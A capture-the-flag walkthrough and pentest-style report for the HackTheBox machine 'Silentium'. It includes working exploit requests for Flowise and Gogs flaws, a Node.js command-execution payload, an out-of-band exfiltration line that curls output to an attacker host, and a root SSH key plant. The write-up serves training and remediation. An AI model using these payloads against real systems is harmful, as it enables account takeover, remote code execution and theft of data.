# HTB "Silentium" — Walkthrough & Penetration Testing Report

**Target:** 10.129.109.201 (`silentium.htb`)
**Difficulty:** Easy
**OS:** Linux (Ubuntu 24.04.4 LTS, kernel 6.8.0-107-generic)
**Status:** COMPLETE — user.txt and root.txt both captured
**Date:** 2026-10-03

---

## 1. Executive Summary

Silentium is an easy-rated Linux box whose compromise hinges entirely on
outdated, internet-facing web applications rather than host misconfiguration.
The public marketing site at `silentium.htb` leaked an employee name ("Ben")
which fed a staging **Flowise 3.0.5** instance (`staging.silentium.htb`)
vulnerable to an unauthenticated password-reset token leak
(**CVE-2025-58434**), giving full account takeover of Ben's Flowise account.
That access was escalated to code execution inside the Flowise Docker
container via a `Function()`-constructor injection in the CustomMCP node
(**CVE-2025-59528**), and a dump of the container's environment variables
leaked an `SMTP_PASSWORD` that turned out to be reused as Ben's real host SSH
password — yielding `user.txt`. Standard local privilege-escalation checks
(SUID/SGID, sudo, cron, capabilities, Docker group) were all clean; the real
escalation path was an internal, non-publicly-enumerable nginx vhost found in
`/etc/nginx/sites-available/` pointing at a **Gogs 0.13.3** instance running
natively as root. Gogs' PutContents API symlink-traversal flaw
(**CVE-2025-8110**) allowed an arbitrary file write as root, used to plant an
attacker SSH key in `/root/.ssh/authorized_keys` and obtain `root.txt`. The
chain is a clean illustration of how an unrelated marketing page, an
internal-only staging app, and un-patched self-hosted DevOps tooling can
combine into a full compromise even when the host OS itself is hardened.

| Stage | Vector | Outcome |
|---|---|---|
| Recon | Marketing-site OSINT | Candidate username `ben` |
| Initial Access | CVE-2025-58434 (Flowise reset-token leak) | Admin account takeover on Flowise |
| Code Execution | CVE-2025-59528 (CustomMCP `Function()` injection) | Root-equivalent RCE inside Flowise's Docker container |
| Lateral Movement | Container env-var leak + password reuse | SSH as `ben` — **user.txt** |
| Privilege Escalation | CVE-2025-8110 (Gogs symlink arbitrary write) | Root SSH — **root.txt** |

---

## 2. Reconnaissance — Step by Step

### 2.1 Host discovery & port scan

```bash
nmap -sn -oN nmap/host_discovery.txt 10.129.109.201        # host is up
nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt 10.129.109.201
nmap -sC -sV -p22,80 -oN nmap/services.txt 10.129.109.201
```

The full 65535-port TCP sweep returns exactly two open ports — a minimal
perimeter typical of an "easy" box where the real complexity lives in the web
application layer, not the network layer:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) |

The `-sC -sV` scan also notes that nginx redirects any bare-IP request to
`http://silentium.htb/` — a strong signal that virtual hosting is in play and
the real content lives behind a `Host:` header nginx is waiting to match.

### 2.2 Main site reconnaissance

```bash
echo "10.129.109.201 silentium.htb" | sudo tee -a /etc/hosts
whatweb http://silentium.htb/
curl -s http://silentium.htb/ -o web/index.html
```

`whatweb` fingerprints a static Tailwind-CSS marketing site: *"Silentium |
Institutional Capital & Lending Solutions"*. Reading the page source (not
just skimming the rendered page) is what actually pays off here — the
**Leadership / Team** section names three staff members:

```html
<h3 class="text-2xl font-serif">Ben</h3>
<p class="uppercase tracking-widest text-xs mt-2">Head of Financial Systems</p>
```

A named "Head of Financial Systems" is an unusually good OSINT target —
someone with that title plausibly has elevated access to internal tooling,
and his first name alone becomes the seed for every username guess for the
rest of the engagement (`ben`, `ben@silentium.htb`).

### 2.3 Virtual-host discovery

```bash
ffuf -u http://10.129.109.201/ -H "Host: FUZZ.silentium.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 178 -t 50 -o fuzz/vhost_ffuf.json -of json
```

nginx's default/catch-all server block returns an identical, fixed-size
(178-byte) `301 Moved Permanently` for every `Host:` header it doesn't
recognize — so filtering ffuf's results on that exact response size (`-fs
178`) cleanly separates noise from a genuine hit. Out of 5,000 candidate
subdomains, exactly **one** matches:

```
staging.silentium.htb  ->  200 OK, 3142 bytes, distinct content
```

```bash
echo "10.129.109.201 staging.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging.silentium.htb/ -o web/staging.html
```

The response is a React single-page app. Its `<title>` and bundled JS
(`web/staging_bundle.js`) both identify it unambiguously as **Flowise** — an
open-source low-code platform for building LLM/agent workflows.

### 2.4 Fingerprinting Flowise precisely

Rather than guessing the version from the UI, Flowise exposes two
unauthenticated diagnostic endpoints that answer directly:

```bash
curl -s http://staging.silentium.htb/api/v1/ping
# -> pong

curl -s http://staging.silentium.htb/api/v1/version
# -> {"version":"3.0.5"}

curl -s http://staging.silentium.htb/api/v1/chatflows -o /dev/null -w "%{http_code}\n"
# -> 401   (confirms Flowise 3.x's default auth-required posture — can't just browse data)
```

**Flowise 3.0.5, confirmed live.** This single version string is what makes
the rest of the chain possible: both vulnerabilities used below (CVE-2025-
58434 and CVE-2025-59528) have version ranges that include exactly this
build.

🎯 *At this point in the engagement, the externally visible attack surface
is fully mapped: a static marketing site (dead end, but a great OSINT
source) and one vulnerable internal application accidentally exposed on a
"staging" subdomain. A fourth host — the Gogs git server that eventually
yields root — genuinely cannot be found from here; it isn't in any wordlist
and doesn't respond to direct name guesses (`gogs.`, `internal.`, `git.`,
`vcs.`, `code.`, `repo.`, `scm.silentium.htb` were all tried and all hit the
same catch-all). It only becomes discoverable once there's a foothold on the
host itself — see Section 5.*

---

## 3. Initial Access — CVE-2025-58434: Flowise Unauthenticated Password-Reset Token Leak

### 3.1 The vulnerability

| | |
|---|---|
| **Affected** | Flowise ≤ 3.0.5 |
| **Fixed in** | 3.0.6 |
| **Advisory** | GHSA-wgpv-6j63-x5ph |
| **Auth required** | None |
| **PoC reference** | `/usr/share/exploitdb/exploits/typescript/webapps/52557.py` |

Flowise's self-service password reset flow is a standard two-step pattern:
request a reset (server emails a one-time token), then submit that token
with a new password. The bug is that step one's HTTP response **also**
includes the token directly in the JSON body — intended only for internal
use/testing, never meant to reach the client in a real deployment, but
shipped that way regardless. Anyone who knows a registered email address can
skip the email entirely and read the token straight off the wire.

### 3.2 Exploitation, step by step

**Step 1 — Request a password reset for the target account, and read the
token out of the response instead of waiting for an email:**

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "…",
    "email": "ben@silentium.htb",
    "name": "admin",
    "tempToken": "eyJhbGciOiJI...",
    "isOrganizationAdmin": true
  }
}
```

The `201 Created` response confirms two things at once: `ben@silentium.htb`
is a real, pre-existing Flowise account (validating the recon-stage username
guess), and it's the **organization admin** account — the single best
target on the whole instance.

**Step 2 — Use the leaked token to set a new password:**

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN_FROM_STEP_1>","password":"Pwned123!"}}'
```

`201 Created` — the password is now `Pwned123!` for `ben@silentium.htb`.

**Step 3 — Log in.** One wrinkle here worth flagging as a lesson in itself:
the obvious-looking route name `/api/v1/account/basic-auth`, visible in the
bundled JS, is **not** the real login endpoint — posting credentials there
returns `{"message":"Authentication failed"}` regardless of correctness.
Reading the actual frontend auth module (`assets/auth-15PRqe3J.js`) reveals
the real route:

```bash
curl -s -c cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"ben@silentium.htb","password":"Pwned123!"}'
```

`200 OK`, with `Set-Cookie` headers for `token`, `refreshToken`, and
`connect.sid`. **We now hold a fully authenticated, org-admin Flowise
session for Ben — zero credentials, zero email access required.**

💡 *Lesson: when a login attempt against an "obvious" endpoint fails even
with correct credentials, don't assume the credentials are wrong — read the
client-side code to confirm you're hitting the actual route the UI uses.*

---

## 4. Code Execution — CVE-2025-59528: Flowise CustomMCP Node `Function()` Injection RCE

### 4.1 The vulnerability

| | |
|---|---|
| **Affected** | Flowise ≥ 2.2.7-patch.1, < 3.0.6 |
| **Fixed in** | 3.0.6 |
| **Auth required** | Yes — any authenticated account |
| **Endpoint** | `POST /api/v1/node-load-method/customMCP` |
| **PoC reference** | `/usr/share/exploitdb/exploits/multiple/webapps/52440.py` |

Flowise's **CustomMCP** node lets a user configure a custom Model Context
Protocol server connection by supplying a JSON-ish configuration blob
(`mcpServerConfig`). Internally, a helper function called
`convertToValidJSONString` is responsible for turning that user-supplied
string into a usable JavaScript object — and it does this by handing the
raw string straight to the **`Function()` constructor**, which is exactly as
dangerous as `eval()`: it compiles and executes arbitrary JavaScript in the
Node.js process. Because it's a *constructor* (not calling `eval` on a
string), the Flowise backend does nothing to sandbox what gets returned, and
the config field was never designed to hold executable code — just to hold
one.

### 4.2 Exploitation

With the authenticated session cookie from Section 3, the CustomMCP node's
`listActions` "load method" can be invoked directly against the backend
without ever building an actual workflow in the UI:

```bash
curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H 'Content-Type: application/json' \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\"); return cp.execSync(\"id\").toString();})()})"
    }
  }'
```

The payload abuses `Function()`'s full JS runtime access: it grabs Node's
own `child_process` module via `process.mainModule.require(...)` (bypassing
the normal `require("child_process")` that a sandboxed `Function()` scope
would otherwise lack access to as a bound identifier) and calls `execSync`
on an arbitrary shell command.

**A practical snag:** the HTTP response to this call is *always* the
generic placeholder `[{"label":"No Available Actions","name":"error", …}]`,
regardless of whether the command succeeded — the endpoint never echoes
`execSync`'s stdout back to the caller. Rather than fight that, command
output was exfiltrated **out-of-band**:

```bash
# Attacker side: start a throwaway listener
python3 -m http.server 8000

# Payload (conceptually): run the real command, base64-encode the output
# to make it URL-safe, and curl it to the attacker listener as a path segment
"({x:(function(){const cp=process.mainModule.require('child_process');
   cp.execSync('curl http://<attacker-tun0-ip>:8000/' + Buffer.from(cp.execSync('id').toString()).toString('base64'));
   return 'ok';})()})"
```

The attacker's `python3 -m http.server` access log then shows the request
path, which is simply base64-decoded to recover the real command output —
no listener-catching, no reverse shell, and no reliance on a fragile
bind/connect-back shell surviving this operator's tooling environment.

Running `id` this way confirms:

```
uid=0(root) gid=0(root) groups=0(root)
hostname: c78c3cceb7ba
```

**Root — but only inside Flowise's own Docker container**, not the host.
The short hex hostname is the giveaway: that's a Docker container ID, not
the box's real hostname (`silentium`).

### 4.3 Harvesting the container's environment

The same blind-exfil technique is used to dump `env`:

```
SMTP_USER=test
SMTP_USERNAME=test
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SENDER_EMAIL=ben@silentium.htb
DATABASE_PATH=/root/.flowise
SECRETKEY_PATH=/root/.flowise
```

Two credential pairs stand out: `FLOWISE_USERNAME`/`FLOWISE_PASSWORD` (the
app's own HTTP basic-auth gate — a separate, outer layer of auth Flowise
*can* be configured with, distinct from the per-account login used above),
and `SMTP_USERNAME`/`SMTP_PASSWORD` (credentials for whatever mail relay
Flowise uses to actually send password-reset emails in a correctly
configured deployment). Neither is obviously "the way to the host" — that
only becomes clear in the next section.

---

## 5. Lateral Movement — Credential Reuse to a Real Host Account (user.txt)

Both leaked credential pairs were tried against host SSH for the candidate
username `ben`:

```bash
ssh ben@10.129.109.201     # try FLOWISE_PASSWORD: F1l3_d0ck3r
# Permission denied — dead end, logged to Failed Attempts

ssh ben@10.129.109.201     # try SMTP_PASSWORD: r04D!!_R4ge
# Accepted!
```

```bash
sshpass -p 'r04D!!_R4ge' ssh ben@10.129.109.201 'id; hostname; uname -a'
```

```
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
silentium
Linux silentium 6.8.0-107-generic #107-Ubuntu SMP x86_64 GNU/Linux
```

**A real, interactive shell on the host itself — not a container.** The
`SMTP_PASSWORD` meant for an application's outbound mail relay turned out to
double as a human engineer's real login password. `FLOWISE_PASSWORD`, by
contrast, really was scoped only to the app's own basic-auth gate and goes
nowhere near the host — an important distinction to verify rather than
assume, since leaked secrets of superficially similar shape (both look like
"app password env vars") can have completely different blast radii.

```bash
sshpass -p 'r04D!!_R4ge' ssh ben@10.129.109.201 'cat ~/user.txt'
```

```
🏁 user.txt: [REDACTED-HTB-FLAG]
```

---

## 6. Privilege Escalation — The Dead Ends First

Before finding the real path to root, the standard local-enumeration
checklist was run in full — and every single item came back clean, which is
worth documenting precisely so the eventual real finding (Section 7) doesn't
look like it was stumbled into blindly:

```bash
sudo -l
# Sorry, user ben may not run sudo on silentium.
# (tried with BOTH known passwords — r04D!!_R4ge and F1l3_d0ck3r — same result either way:
#  ben simply isn't in sudoers at all, this is not a password problem)

find / -xdev -perm -4000 -type f 2>/dev/null
# only stock Ubuntu SUID binaries: gpasswd, umount, chfn, fusermount3, newgrp, sudo,
# mount, su, chsh, passwd, dbus-daemon-launch-helper, polkit-agent-helper-1, ssh-keysign

find / -xdev -perm -2000 -type f 2>/dev/null
# only stock SGID binaries: ssh-agent, chage, expiry, crontab, utempter,
# pam_extrausers_chkpwd, unix_chkpwd

getcap -r / 2>/dev/null
# only stock capabilities: ping/mtr-packet (cap_net_raw), snap-confine, gst-ptp-helper

cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.{hourly,daily,weekly}/
# only stock Ubuntu system jobs: logrotate, man-db, apt-compat, sysstat, apport, e2scrub_all
# — nothing custom, nothing writable by ben

docker ps
# permission denied while trying to connect to the Docker daemon socket
# (ben is not in the docker group — not a usable pivot, though moot anyway since the
#  real escalation path turns out not to be container-related at all)

ss -tlnp
# 127.0.0.1:3000   Flowise (already known)
# 127.0.0.1:3001   <-- unidentified at this point; turns out to be Gogs, see below
# 127.0.0.1:8025, 127.0.0.1:1025   MailHog (SMTP capture UI) — not separately exploited
# 127.0.0.54:53, 127.0.0.53:53     local systemd-resolved DNS stubs
# 0.0.0.0:22, 0.0.0.0:80           already known (SSH, nginx)
```

🎯 *Lesson: on this box, the "quick wins" checklist is a genuine, correct
dead end — not a step to skip, but also not where the real finding lives.
The one line of signal buried in `ss -tlnp` (an unidentified service on
`127.0.0.1:3001`) is what actually leads somewhere, and it only means
anything once cross-referenced with the next step.*

---

## 7. Privilege Escalation — CVE-2025-8110: Gogs PutContents API Symlink Arbitrary File Write

### 7.1 Finding the internal Gogs instance

The unidentified `127.0.0.1:3001` listener from Section 6 is explained by
reading the host's own nginx virtual-host configuration — something only
visible from inside the foothold, never from outside:

```bash
ls -la /etc/nginx/sites-available/
cat /etc/nginx/sites-available/staging-v2-code
```

```nginx
server {
    listen 80;
    server_name staging-v2-code.dev.silentium.htb;
    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        ...
    }
}
```

**There it is** — a vhost name (`staging-v2-code.dev.silentium.htb`) that
never appeared in any wordlist and was never guessable from outside, proxying
to the mystery port from `ss -tlnp`.

```bash
curl -s http://127.0.0.1:3001/ | grep -io '<title>[^<]*</title>'
# <title>Gogs</title>

ps aux | grep gogs
# root   1501  ...  /opt/gogs/gogs/gogs web

/opt/gogs/gogs/gogs --version
# Gogs version 0.13.3

cat /opt/gogs/gogs/custom/conf/app.ini
# RUN_USER = root
# DISABLE_REGISTRATION = false
# ENABLE_REGISTRATION_CAPTCHA = true
# REQUIRE_SIGNIN_VIEW = false
```

Three facts combine into a critical finding:
1. **Gogs 0.13.3** is running — a version with a known symlink-handling bug.
2. It's running as **`root`**, natively via systemd (`gogs.service`), not
   sandboxed in a container the way Flowise was.
3. Self-registration is **open** (just captcha-gated) — an attacker doesn't
   need Ben's credentials (which, confirmed by testing, don't have a Gogs
   account anyway) to get an authenticated session.

From the attacker box, once the real vhost name is known, it turns out to be
reachable directly over the box's already-open public port 80 — the vhost
was never actually network-isolated, just unlisted:

```bash
echo "10.129.109.201 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging-v2-code.dev.silentium.htb/ | grep -io '<title>[^<]*</title>'
# <title>Gogs</title>   — confirmed reachable from outside
```

### 7.2 The vulnerability

| | |
|---|---|
| **Affected** | Gogs ≤ 0.13.3 |
| **Endpoint** | `PUT /api/v1/repos/:owner/:repo/contents/:path` |
| **Auth required** | Yes — any authenticated account (even newly self-registered) |
| **PoC used** | `github.com/3jee/CVE-2025-8110` |

Gogs' repository-contents API lets a user update a file in one of their own
repos over HTTP, specifying the target path as part of the URL and the new
content as base64 in the request body. The API correctly rejects a path
containing `../` — so a direct traversal attempt fails. **What it does not
do** is resolve symbolic links before writing. If a repository already
contains a *symlink* at some path (a completely ordinary thing to commit in
git), and the API is then asked to update the content *at that symlink's
path*, Gogs happily follows the link on disk and overwrites whatever the
link actually points to — anywhere on the filesystem the Gogs process can
write, which here is **everywhere**, because Gogs runs as root.

### 7.3 Exploitation, step by step

**Step 1 — Register an attacker-controlled Gogs account.** Ben's three
already-known passwords (`r04D!!_R4ge`, `F1l3_d0ck3r`, `Pwned123!`) were
tried against Gogs login first and all failed — he genuinely has no
pre-existing Gogs account. Since self-registration is open:

```
POST /user/sign_up
  user_name=pwnagent&email=pwnagent@attacker.local
  &password=Pwnage123!&retype=Pwnage123!
  &captcha_id=<id>&captcha=<solved_value>&_csrf=<csrf>
```

The registration form is gated by a distorted 6-digit numeric captcha.
Automated OCR (`tesseract`, tried both raw and on a 4×-upscaled image) failed
to reliably read the deliberately noisy digits; a few rounds of simply
*looking* at the regenerated captcha image directly were faster and fully
reliable (e.g. one presented as `723318`, submitted verbatim).

**Step 2 — Mint an API token** for the new account, so the exploit script
can authenticate without re-handling session cookies:

```bash
curl -s -u pwnagent:Pwnage123! -X POST \
  http://staging-v2-code.dev.silentium.htb/api/v1/users/pwnagent/tokens \
  -d '{"name":"pwntoken"}'
# -> {"sha1":"70eab2df7ae368f7421c9953694c5d55f6943a99", ...}
```

**Step 3 — Generate an attacker SSH keypair** whose public half will become
the payload:

```bash
ssh-keygen -t ed25519 -f loot/silentium_root_key -N ""
```

**Step 4 — Run the exploit.** Under the hood, the public PoC
(`CVE-2025-8110.py`) automates exactly the sequence the vulnerability
requires:

1. `POST /repo/create` — create a fresh, throwaway repository owned by
   `pwnagent`.
2. Clone it locally, then create a **symbolic link** inside the working
   tree: `ln -s /root/.ssh/authorized_keys payload`.
3. `git add payload && git commit && git push` — commit the symlink itself
   (not its target's contents) into the repo. Git tracks symlinks as a
   special blob type; this is completely ordinary version-control behavior,
   not an exploit in itself.
4. Call the vulnerable API on the symlink's path within that repo:
   `PUT /api/v1/repos/pwnagent/<repo>/contents/payload`, body
   `{"content": "<base64 of the SSH public key>", "message": "update"}`,
   `Authorization: token 70eab2df7ae368f7421c9953694c5d55f6943a99`.
5. Gogs resolves `payload` → follows the on-disk symlink →
   `/root/.ssh/authorized_keys` → writes the decoded content there, running
   as `root`.

```bash
python3 /tmp/CVE-2025-8110/CVE-2025-8110.py \
  --url http://staging-v2-code.dev.silentium.htb \
  -u pwnagent -p 'Pwnage123!' \
  --target-file /root/.ssh/authorized_keys \
  --content-file loot/silentium_root_key.pub
```

```
[+] Repository created
[+] Symlink committed and pushed
[+] PutContents call succeeded
[+] Write OK
```

**Step 5 — Authenticate as root** using the keypair whose public half just
landed in root's `authorized_keys`:

```bash
ssh -i loot/silentium_root_key root@10.129.109.201 'id; hostname; cat /root/root.txt'
```

```
uid=0(root) gid=0(root) groups=0(root)
silentium
```

```
🏁 root.txt: [REDACTED-HTB-FLAG]
```

**Full root, via a single authenticated HTTP write.** No kernel exploit, no
binary exploitation, no brute force — just a git server that trusted its own
filesystem's symlinks a little too much, running with far more privilege
than it needed.

---

## 8. Key Vulnerabilities Identified

### 8.1 CVE-2025-58434 — Flowise Unauthenticated Password-Reset Token Leak
- **Component/version:** Flowise ≤ 3.0.5 (fixed in 3.0.6).
- **Description:** `POST /api/v1/account/forgot-password` returns the reset
  `tempToken` directly in the JSON response body to an unauthenticated
  caller instead of only emailing it, enabling full account takeover of any
  known email address with zero credentials and zero mailbox access.
- **Estimated CVSS:** 9.1 (Critical) — estimate
  (`AV:N/AC:L/PR:N/UI:N/C:H/I:H/A:N`); not an official NVD score.
- **Remediation:** Upgrade to Flowise ≥ 3.0.6. Until patched, disable
  self-service reset or front it with rate limiting/MFA, and rotate all
  credentials on the affected instance.

### 8.2 CVE-2025-59528 — Flowise CustomMCP Node `Function()` Injection RCE
- **Component/version:** Flowise ≥ 2.2.7-patch.1, < 3.0.6 (fixed in 3.0.6).
- **Description:** The CustomMCP node's `convertToValidJSONString` helper
  passes user-supplied `mcpServerConfig` straight into a JS `Function()`
  constructor at `POST /api/v1/node-load-method/customMCP`, giving any
  authenticated account arbitrary Node.js code execution — including shelling
  out via `process.mainModule.require("child_process")`.
- **Estimated CVSS:** 8.8 (High) — estimate
  (`AV:N/AC:L/PR:L/UI:N/C:H/I:H/A:H`); not an official NVD score.
- **Remediation:** Upgrade to Flowise ≥ 3.0.6. Never evaluate user-controlled
  strings with `Function()`/`eval()`; run the Flowise container as a
  non-root user; don't store plaintext secrets in container env vars
  readable by any code-exec primitive.

### 8.3 Credential Reuse — SMTP Password Reused as Host SSH Password
- **Component:** Flowise container's `SMTP_PASSWORD` env var == `ben`'s
  host Linux account password.
- **Description:** Not a CVE — a secrets-management failure. An
  application-tier credential (meant for an outbound mail relay) doubled as
  a human engineer's OS login, directly converting container RCE into a
  host foothold.
- **Remediation:** Never reuse application/service credentials for personal
  accounts. Store secrets in a vault, not container env vars; rotate SMTP
  credentials; enforce unique passwords per account/service.

### 8.4 CVE-2025-8110 — Gogs PutContents API Arbitrary File Write via Symlink Bypass
- **Component/version:** Gogs ≤ 0.13.3; confirmed exactly 0.13.3, running
  as `root` (`RUN_USER = root`).
- **Description:** `PUT /api/v1/repos/:owner/:repo/contents/:path`
  sanitizes against `../` traversal but does not resolve symlinks before
  writing. A low-privilege authenticated user can commit a symlink pointing
  anywhere on disk, then call PutContents on that symlink's path to
  overwrite the real target — as whatever user runs Gogs. Here, that's root.
- **Estimated CVSS:** 8.8 (High) — estimate
  (`AV:N/AC:L/PR:L/UI:N/C:H/I:H/A:H`); not an official NVD score. Practical
  impact is full root compromise due to the `RUN_USER = root` misconfig.
- **Remediation:** Upgrade Gogs past the CVE-2025-8110 fix. Never run Gogs
  as root — use a dedicated unprivileged `RUN_USER`. Disable open
  self-registration or gate it behind admin approval. Keep internal DevOps
  tooling off the same public-facing reverse proxy, or restrict it to an
  internal network/VPN.

### 8.5 Internal Vhost Discoverable Only Post-Foothold (defense-in-depth note)
- **Description:** `staging-v2-code.dev.silentium.htb` was never found by
  broad `ffuf` fuzzing (5,000-entry wordlist) or direct name guesses — only
  by reading `/etc/nginx/sites-available/` after the SSH foothold. Once its
  exact hostname was known, though, nginx proxied it on the same public
  port 80 with zero additional restriction. Hostname obscurity provided no
  real isolation the moment any foothold existed.
- **Remediation:** Bind internal management/DevOps interfaces (git servers,
  CI, admin panels) to localhost or an internal-only network/VPN — not
  merely an unlisted public vhost.

---

## 9. Credentials & Artifacts

| Credential / Artifact | Value | Source | Works on |
|---|---|---|---|
| Candidate username | `ben` | `silentium.htb` Leadership/Team section | Confirmed real Flowise account via CVE-2025-58434 |
| Flowise account password (attacker-set) | `Pwned123!` | Set via CVE-2025-58434 reset flow | `ben@silentium.htb` on Flowise app only |
| `FLOWISE_USERNAME`/`FLOWISE_PASSWORD` | `ben` / `F1l3_d0ck3r` | Flowise container env dump | Flowise basic-auth gate only — **confirmed NOT valid for host SSH** |
| `SMTP_USERNAME`/`SMTP_USER` | `test` | Flowise container env dump | MailHog SMTP config, not separately exploited |
| `SMTP_PASSWORD` | `r04D!!_R4ge` | Flowise container env dump | **Host SSH password for `ben`** — led to user.txt |
| `JWT_AUTH_TOKEN_SECRET` | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` | Flowise container env dump | Flowise JWT signing secret; not independently exploited |
| Gogs throwaway account | `pwnagent` / `Pwnage123!` | Self-registered (open registration) | `staging-v2-code.dev.silentium.htb` only |
| Gogs API token | `70eab2df7ae368f7421c9953694c5d55f6943a99` | `POST /api/v1/users/pwnagent/tokens` | Authenticated the CVE-2025-8110 PoC |
| Attacker SSH keypair | `loot/silentium_root_key`(.pub) | `ssh-keygen` | Public half written to root's `authorized_keys`; private half used for root login |
| **user.txt** | `[REDACTED-HTB-FLAG]` | `/home/ben/user.txt` | Captured |
| **root.txt** | `[REDACTED-HTB-FLAG]` | `/root/root.txt`, local copy `loot/root.txt` | Captured |

---

## 10. Evidence Index

| Evidence file | Contents |
|---|---|
| `nmap/host_discovery.txt` | `-sn` ping sweep confirming host up |
| `nmap/allports.txt` | Full TCP sweep — only 22, 80 open |
| `nmap/services.txt` | `-sC -sV` — OpenSSH 9.6p1, nginx 1.24.0, redirect to `silentium.htb` |
| `web/index.html` | Main site HTML — Leadership/Team section naming "Ben" |
| `web/whatweb.txt` | WhatWeb fingerprint of `silentium.htb` |
| `web/staging.html`, `staging_direct.html`, `staging_bundle.js` | Flowise app confirming v3.0.5 |
| `web/bogusvhost.html` | Catch-all 301 baseline (178-byte body) used to filter ffuf noise |
| `fuzz/vhost_ffuf.json` | ffuf vhost run — only `staging` matched |
| `loot/root.txt` | Saved copy of the root flag |
| `loot/silentium_root_key`(.pub) | Attacker keypair used in the CVE-2025-8110 exploit |
| `GLOBAL_CONTEXT.md` | Full blackboard record referenced throughout this report |

## Needs Verification

- **`loot/user.txt`:** No local copy was saved alongside `loot/root.txt`
  before the HTB instance despawned; the value is recorded live in
  `GLOBAL_CONTEXT.md` from the original SSH capture and is not in doubt, but
  there's no on-disk file to cross-check it against.
- **`web/robots.txt`:** mislabeled during collection — it actually holds a
  copy of the main site's HTML, not real robots.txt content. No finding in
  this report relies on it.
- **CVSS scores:** all values in Section 8 are estimates derived from each
  vulnerability's mechanics, not pulled from an official NVD/GHSA score
  field; treat as estimates pending confirmation against the authoritative
  entries.
